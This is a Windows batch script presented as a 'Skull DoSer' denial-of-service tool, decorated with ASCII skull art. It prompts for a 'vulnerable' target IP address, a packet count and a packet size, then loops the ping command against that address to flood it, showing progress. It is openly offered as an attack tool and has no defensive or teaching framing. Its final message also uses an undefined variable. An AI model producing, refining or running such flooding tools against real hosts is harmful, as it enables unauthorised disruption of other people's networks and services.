@echo off
cls
	rem made by Andrew The Skid
:Skull
title Skull Dos                                          
:::                                                                           
:::                             (
:::                  .            )        )
:::                           (  (|              .
:::                       )   )\/ ( ( (
:::               *  (   ((  /     ))\))  (  )    )
:::             (     \   )\(          |  ))( )  (|
:::             >)     ))/   |          )/  \((  ) \
:::             (     (      .        -.     V )/   )(    (
:::              \   /     .   \            .       \))   ))
:::                )(      (  | |   )            .    (  /
:::               )(    ,'))     \ /          \( `.    )
:::                (\>  ,'/__      ))            __`.  /
:::              ( \   | /  ___   ( \/     ___   \ | ( (
:::               \.)  |/  /   \__      __/   \   \|  ))
:::              .  \. |>  \      | __ |      /   <|  /
:::                   )/    \____/ :..: \____/     \ <
:::           ((    )\)  ~--_     --  --      _--~    /  ))
:::            \    (    |  ||               ||  |   (  /
:::                  \.  |  ||_             _||  |  /
:::                    > :  |  ~V+-I_I_I-+V~  |  : (.
:::                   (  \:  T\   _     _   /T  : ./
:::                    \  :    T^T T-+-T T^T    ;<
:::                     \..`_       -+-       _'  )
:::                        . `--=.._____..=--'. ./      
:::                          Welcome To The
color 4
:::                           SKULL DOSER
for /f "delims=: tokens=*" %%A in ('findstr /b ::: "%~f0"') do @echo(%%A

	set /p ip=Enter a Vulnerable IP Address:
	set /p count=Enter The Number Of Packets:
	set /p byte=How Many Bytes Per Packet?:

	setlocal enabledelayedexpansion

echo Sending %count% packets of %byte% bytes to %ip%...
timeout /t 2 /nobreak nul

cls

set sent=0
cls
for /l %%i in (1,1,%count%) do (
    ping -n 1 -w 100 %ip% -l %byte% >nul

    set /a sent=%%i

    echo Pinging %ip%, %count% Packets, With %byte% Bytes. PROGRESS: !sent! Out Of %count%
title PROGRESS: !sent! out of %count%
)
cls
title Done!
echo DONE! Sent %ip% %count% Packets %bytes% Per Packet.
echo (please keep in mind alot of packets may have failed to send)

set /p input="Do you want to Ping Another ip?(Y/N)"
   if /I "%input%" EQU "Y" Goto Skull
   if /I "%input%" EQU "y" Goto Skull
   if /I "%input%" EQU "N" Goto exit
   if /I "%input%" EQU "n" Goto exit

:exit
	exit
